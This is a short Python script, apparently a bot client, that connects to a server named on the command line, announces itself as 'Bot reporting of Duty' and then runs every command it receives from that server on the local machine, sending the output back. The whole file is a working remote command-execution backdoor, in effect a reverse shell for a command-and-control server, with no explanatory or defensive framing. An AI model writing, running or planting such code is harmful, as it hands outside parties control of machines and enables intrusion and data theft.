import sys
from subprocess import Popen, PIPE
from socket import *

serverName = sys.argv[1] # 1
serverPort = 8000

clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))
clientSocket.send('Bot reporting of Duty'.encode())

command = clientSocket.recv(4064).decode()
while command != "exit":
    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
    result, err = proc.communicate()
    clientSocket.send(result)
    command = (clientSocket.recv(4064).decode())
clientSocket.close()



